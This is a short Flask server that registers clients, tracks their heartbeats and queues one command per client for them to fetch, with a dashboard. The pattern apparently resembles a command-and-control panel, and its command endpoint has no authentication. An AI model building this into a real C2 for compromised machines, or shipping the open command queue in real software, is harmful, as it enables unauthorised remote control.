from flask import Flask, request, jsonify, render_template
import time

app = Flask(__name__)
clients = {}

@app.route("/")
def index():
    return render_template("index.html", clients=clients)

@app.route("/register", methods=["POST"])
def register():
    cid = request.json["id"]
    clients[cid] = {
        "last": time.time(),
        "cmd": None
    }
    return jsonify(ok=True)

@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    cid = request.json["id"]
    if cid in clients:
        clients[cid]["last"] = time.time()
    return jsonify(ok=True)

@app.route("/send_cmd", methods=["POST"])
def send_cmd():
    cid = request.json["id"]
    cmd = request.json["cmd"]
    if cid in clients:
        clients[cid]["cmd"] = cmd
    return jsonify(ok=True)

@app.route("/get_cmd", methods=["POST"])
def get_cmd():
    cid = request.json["id"]
    cmd = None
    if cid in clients:
        cmd = clients[cid]["cmd"]
        clients[cid]["cmd"] = None
    return jsonify(cmd=cmd)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
